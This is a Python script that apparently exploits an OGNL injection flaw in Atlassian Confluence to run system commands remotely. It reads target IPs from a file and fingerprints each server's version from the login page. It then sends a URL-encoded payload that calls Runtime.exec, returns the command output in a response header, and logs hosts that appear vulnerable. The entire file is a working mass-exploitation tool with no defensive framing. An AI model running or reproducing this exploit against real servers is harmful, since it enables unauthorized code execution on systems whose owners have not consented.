# -*- coding: utf-8 -*-

import requests
import urllib3
import re

urllib3.disable_warnings()
def check_target_version(host):
    try:
        response = requests.get("{}/login.action".format(host), verify=False, timeout=8)
        if response.status_code == 200:
            filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
            if len(filter_version) >= 1:
                version = filter_version[0].split("'>")[1].split('</')[0]
                return version
            else:
                return 0
        else:
            return host
    except:
        return False


def send_payload(host, command):
    payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(
        command)

    response = requests.get("{}/{}/".format(host, payload), verify=False, allow_redirects=False)

    try:
        if response.status_code == 302:
            url = host
            with open('./output.txt', 'a+') as f:
                f.write(url + '\n')
            return response.headers["X-Cmd-Response"]
        else:
            return "This target does not seem to be vulnebrale."
    except:
        return "This target does not seem to be vulnerable."


def main():
    with open("./input.txt", "r", ) as f:
        ips = f.read().split('\n')
        for ip in ips:
            host = 'https://' + ip
            cmd = "id"
            version = check_target_version(host)
            if version:
                print("Confluence target version: \033[1;94m{}\033[1;m".format(version))
            elif version == False:
                print("The taget seems offline.")
                return
            else:
                print("Can't find the used version for this target.")

            exec_payload = send_payload(host, cmd)
            print(exec_payload)


if __name__ == "__main__":
    main()